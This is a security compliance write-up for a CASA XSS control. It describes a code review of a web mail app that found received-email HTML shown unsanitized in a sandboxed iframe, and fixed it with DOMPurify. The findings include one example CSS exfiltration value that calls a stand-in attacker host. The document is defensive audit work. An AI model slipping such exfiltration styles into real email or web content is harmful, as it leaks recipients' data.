# CASA 5.1.7 — Data Validation and Sanitization: XSS protection

> **Control 5.1.7 — Data Validation and Sanitization / Implement validation &
> input sanitization**
>
> *Context-aware output escaping or sanitization protects against reflected,
> stored, and DOM based XSS.*
>
> **Deliverable**
> 1. Testing results from a scan completed using the ADA's Dynamic Application
>    Security Testing Guidance. Scanning may be performed by the developer or by
>    an authorized testing lab.

---

## Short answer (for the CASA portal)

A code review found and fixed a real gap: the received-email HTML viewer
rendered raw, unsanitized email bodies (a stored-XSS surface by construction —
every email is attacker-controllable content) into a sandboxed iframe with no
sanitization layer, relying solely on the iframe sandbox and CSP to prevent
script execution. This has been fixed by routing received-email HTML through
the app's existing DOMPurify sanitizer before display, matching the protection
already applied to the compose/forward editor. Every other surface reviewed —
JSON-LD structured data, MDX blog content, AI chat output, and all
user-controlled display names — was already correctly protected by React's
default auto-escaping or an appropriate sanitizer.

## Deliverable — findings and fix

### Gap found and fixed: received-email HTML viewer

The app has two email-HTML code paths in
`apps/web/modules/saas/mailboxes/lib/email-html.ts`:

- **`sanitizeEmailHtml()`** — DOMPurify with an explicit allowlist
  (`ALLOWED_TAGS`/`ALLOWED_ATTR`), forbidding `script`, `style`, `iframe`,
  `object`, `embed`, `form`, `link` tags and `onerror`/`onload`/`onclick`
  attributes, plus a regex-based SSR fallback for the server-render pass.
  Correctly used by the compose/forward editor (`HtmlEditor.tsx`,
  `buildForwardHtml()`).
- **`buildEmailSrcDoc()`** — wraps a raw HTML string in a sandboxed iframe
  document for displaying a received email. Before this fix, it **never
  called `sanitizeEmailHtml()`** — it only stripped `cid:` image sources and
  relied entirely on the iframe's `sandbox` attribute (no `allow-scripts`)
  and a CSP meta tag (`script-src 'none'`) to prevent script execution.

Both call sites — `InboxPage.tsx` (the main message detail view) and
`PaymentDetailDialog.tsx` (the payment-tracking card detail view) — pass
`bodyHtml` straight from the mail provider (Gmail/Outlook) with no
sanitization step before it reached `buildEmailSrcDoc()`.

**Why this mattered even with the sandbox in place:** the missing
`allow-scripts` and the CSP did block classic `<script>`-tag and
inline-event-handler execution — this was not an actively exploitable
script-execution hole. But it was a single point of failure: safety rested
entirely on the sandbox attribute and CSP string staying correct, with no
sanitization as a second layer. Concretely, it was exploitable *without* any
script execution: the `style` **attribute** (as opposed to the `<style>` tag,
which was already implicitly blocked by the CSP's `script-src`/lack of tag
stripping being irrelevant here) passed through untouched, and the CSP allows
`style-src 'unsafe-inline'` — enough for CSS-based data exfiltration
(`background: url(https://attacker.example/leak?data=...)`) or a visual
spoofing/clickjacking overlay, neither of which needs JavaScript.

**Fix** — `apps/web/modules/saas/mailboxes/lib/email-html.ts`,
`buildEmailSrcDoc()`:

```ts
export function buildEmailSrcDoc(html: string): string {
  const sanitized = sanitizeEmailHtml(html).replace(/src="cid:[^"]*"/gi, 'src=""');
  // ... unchanged wrapping
}
```

Sanitization now runs first, so the iframe never receives unsanitized markup
in the first place — the sandbox/CSP become genuine defense-in-depth rather
than the sole defense. No signature change, so neither call site needed
edits.

**Verified in this session** with a crafted payload combining `<script>`, an
`onclick` handler, an `onerror` handler, a `javascript:` URI, an `<iframe>`,
and a `<style>` block, run through both `sanitizeEmailHtml()` and
`buildEmailSrcDoc()` in a `jsdom`-backed environment (so the real DOMPurify
code path executes, not the SSR regex fallback): every dangerous
substring was absent from both functions' output.

### Residual, documented limitation: inline `style` attribute

`sanitizeEmailHtml()`'s `ALLOWED_ATTR` permits the `style` attribute (needed
to preserve legitimate email formatting — colors, fonts, spacing). DOMPurify's
default configuration does not parse or restrict CSS property *values* within
an allowed attribute, so a crafted `style="background:url(...)"` could still
pass through and be used for a CSS-based data-exfiltration or spoofing
attempt, as described above. This is an accepted, documented limitation
rather than a blocking gap: no code-execution path exists here (`script-src
'none'`, no `allow-scripts`), so the worst case is a passive CSS-timing/
tracking-pixel-style leak or a visual overlay — not full XSS. Recorded as a
future hardening candidate (e.g. stripping `url()` values from `style`
attributes, or dropping the `style` attribute for received mail specifically)
rather than fixed in this pass.

### Other surfaces reviewed — already protected

- **`dangerouslySetInnerHTML`** — every other occurrence in `apps/web`
  (`JsonLd.tsx`, `BreadcrumbJsonLd.tsx`, `pricing/page.tsx`, root `layout.tsx`,
  the blog `page.tsx`) injects `JSON.stringify()`'d structured data (JSON-LD
  schema.org markup), not user-controlled HTML.
- **Blog/marketing MDX** — compiled only from the repo's own
  `content/posts`/`content/legal` at build time (dev-authored), with no
  `rehype-raw` or other raw-HTML passthrough — not reachable by any
  user-submitted content.
- **AI chat assistant** — renders LLM output either as plain JSX text
  (auto-escaped) or through `react-markdown` (no `rehype-raw` plugin), never
  as raw HTML — even if LLM output were indirectly influenced by
  attacker-controlled email content, it can't reach `dangerouslySetInnerHTML`.
- **User-controlled display data** (profile names, mailbox nicknames, rule
  names, organization names) — always rendered as plain JSX children
  everywhere in `apps/web/modules/saas`, relying on React's default
  auto-escaping. No string concatenation into HTML markup found.
- **DOM-based XSS** — the only direct `.innerHTML =` assignment
  (`HtmlEditor.tsx`) already uses `sanitizeEmailHtml()`'s output. No
  `document.write()` or URL-param-into-`innerHTML` pattern exists anywhere.
